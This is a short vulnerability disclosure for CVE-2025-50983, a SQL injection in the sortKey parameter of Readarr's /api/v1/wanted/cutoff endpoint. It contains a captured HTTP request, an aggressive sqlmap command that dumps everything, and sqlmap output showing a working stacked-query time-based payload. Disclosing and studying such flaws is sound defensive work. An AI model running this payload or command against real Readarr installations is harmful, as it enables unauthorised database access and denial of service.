CVE-2025-50983



Description
A SQL Injection vulnerability exists in the sortKey parameter of the GET /api/v1/wanted/cutoff API endpoint. The endpoint fails to properly sanitize user-supplied input, allowing attackers to inject and execute arbitrary SQL commands against the backend SQLite database.

Sqlmap confirmed exploitation via stacked queries, demonstrating that the parameter can be abused to run arbitrary SQL statements. A heavy query was executed using SQLite’s RANDOMBLOB() and HEX() functions to simulate a time-based payload, indicating deep control over database interactions.




![](https://github.com/4rdr/proofs/blob/main/gifs/readarr-0.4.15.2787-sql-injection-via-sortkey-parameter.gif?raw=true)






```
GET /api/v1/wanted/cutoff?page=1&pageSize=20&sortDirection=descending&sortKey=releaseDate&monitored=true HTTP/1.1
Host: 172.18.0.2:8787
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Api-Key: eb35ba8a3cfa4b1dbf21f0e2a1f95148
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://172.18.0.2:8787/wanted/cutoffunmet
Priority: u=0
```

Version
```0.4.15.2787```

Command
```
sqlmap.py -r ./reader --level 5 --risk 3 --dbms sqlite -a
```

sqlmap results
```
---
Parameter: sortKey (GET)
    Type: stacked queries
    Title: SQLite > 2.0 stacked queries (heavy query)
    Payload: page=1&pageSize=20&sortDirection=descending&sortKey=releaseDate";SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- gFIj&monitored=true
---
```
